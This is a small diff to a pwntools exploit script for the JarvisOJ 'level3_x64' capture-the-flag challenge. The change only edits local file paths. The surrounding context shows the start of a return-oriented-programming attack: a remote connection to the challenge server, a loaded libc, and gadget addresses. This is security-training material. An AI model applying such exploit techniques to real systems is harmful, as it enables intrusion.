@@ -1,7 +1,7 @@
 from pwn import *
 
 
-def x_man_level3_x64(file_name='/mnt/hgfs/Cyber Security PWN/jarvisoj/level3_x64/[XMAN]level3_x64'):
+def x_man_level3_x64(file_name='/mnt/hgfs/CyberSecurity/PWN/jarvisoj/level3_x64/[XMAN]level3_x64'):
     print('x_man_level3_x64 start')
     context(log_level='info', arch='amd64', os='linux')
 
@@ -9,7 +9,7 @@ def x_man_level3_x64(file_name='/mnt/hgfs/Cyber Security PWN/jarvisoj/level3_x64
     target = remote('pwn2.jarvisoj.com', 9883)
     target_elf = ELF(file_name)
     # libc_elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-    libc_elf = ELF('/mnt/hgfs/Cyber Security PWN/jarvisoj/level3_x64/libc-2.19.so')
+    libc_elf = ELF('/mnt/hgfs/CyberSecurity/PWN/jarvisoj/level3_x64/libc-2.19.so')
 
     pop_ret_gadget = p64(0x4006b3)  # pop rdi ; ret
     pop2_ret_gadget = p64(0x4006b1)  # pop rsi ; pop r15 ; ret
